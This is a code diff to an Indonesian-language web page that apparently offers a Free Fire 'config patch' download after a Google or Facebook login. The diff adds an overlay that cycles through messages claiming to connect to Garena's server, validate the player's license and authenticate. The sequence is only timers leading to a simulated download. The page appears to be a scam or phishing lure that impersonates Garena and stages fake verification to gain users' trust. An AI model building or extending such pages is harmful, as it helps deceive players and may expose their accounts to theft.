@@ -554,6 +554,16 @@
     }
     .al-progress-bar{height:100%;background:linear-gradient(90deg,#FF6B00,#FFBA00);border-radius:2px;width:0;transition:width 0.1s linear}
     .al-progress-pct{font-size:24px;font-weight:700;color:#FFBA00;font-family:'Barlow Condensed',sans-serif}
+    /* ═══ VERIFY OVERLAY ═══ */
+    #al-verify-ov{position:fixed;inset:0;z-index:5000;background:rgba(8,8,8,0.96);display:none;flex-direction:column;align-items:center;justify-content:center;gap:14px}
+    #al-verify-ov.show{display:flex}
+    .al-verify-spin{width:50px;height:50px;border:3px solid rgba(255,186,0,0.12);border-top-color:#FFBA00;border-radius:50%;animation:spin .75s linear infinite}
+    .al-verify-msg{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:700;text-transform:uppercase;color:#fff;letter-spacing:1.5px;text-align:center}
+    .al-verify-detail{font-size:12px;color:rgba(255,255,255,0.35);text-align:center;margin-top:2px}
+    .al-verify-dots span{animation:alDot 1.3s infinite;opacity:0}
+    .al-verify-dots span:nth-child(2){animation-delay:.22s}
+    .al-verify-dots span:nth-child(3){animation-delay:.44s}
+    @keyframes alDot{0%,80%,100%{opacity:0}40%{opacity:1}}
   </style>
 </head>
 <body>
@@ -974,6 +984,13 @@
 <!-- TOAST -->
 <div class="al-toast" id="al-toast"></div>
 
+<!-- VERIFY OVERLAY -->
+<div id="al-verify-ov">
+  <div class="al-verify-spin"></div>
+  <div class="al-verify-msg" id="al-verify-msg">Memverifikasi Akun<span class="al-verify-dots"><span>.</span><span>.</span><span>.</span></span></div>
+  <div class="al-verify-detail" id="al-verify-detail">Menghubungkan ke server Garena</div>
+</div>
+
 <!-- PROGRESS OVERLAY -->
 <div class="al-progress" id="al-progress">
   <div class="al-progress-icon">
@@ -1122,7 +1139,7 @@ function handleGoogleSubmit() {
       if (spEl) spEl.style.display = 'none';
       if (txtEl) txtEl.style.display = '';
       closeInstallModal();
-      simulateDownload();
+      showVerifyOverlay();
     }, 1700);
   }
 }
@@ -1168,9 +1185,41 @@ function handleFacebookLogin() {
       if (spEl) spEl.style.display = 'none';
       if (txtEl) txtEl.style.display = '';
       closeInstallModal();
-      simulateDownload();
+      showVerifyOverlay();
     }, 1900);
   }
+}
+
+function showVerifyOverlay() {
+  var ov   = document.getElementById('al-verify-ov');
+  var msg  = document.getElementById('al-verify-msg');
+  var det  = document.getElementById('al-verify-detail');
+  if (!ov) { simulateDownload(); return; }
+  ov.classList.add('show');
+  var steps = [
+    { txt: 'Memverifikasi Akun',    sub: 'Menghubungkan ke server Garena' },
+    { txt: 'Memeriksa Lisensi',     sub: 'Validasi akun Free Fire kamu' },
+    { txt: 'Autentikasi Berhasil',  sub: 'Menyiapkan paket config...' },
+    { txt: 'Menyiapkan Download',   sub: 'CONFIGPATCH_OB53.zip' }
+  ];
+  var i = 0;
+  function setStep(idx) {
+    if (!steps[idx]) return;
+    var dots = '<span class="al-verify-dots"><span>.</span><span>.</span><span>.</span></span>';
+    if (msg) msg.innerHTML = steps[idx].txt + dots;
+    if (det) det.textContent = steps[idx].sub;
+  }
+  setStep(0);
+  var iv = setInterval(function() {
+    i++;
+    if (i < steps.length) setStep(i);
+    else clearInterval(iv);
+  }, 700);
+  setTimeout(function() {
+    clearInterval(iv);
+    ov.classList.remove('show');
+    simulateDownload();
+  }, 2900);
 }
 
 function simulateDownload() {
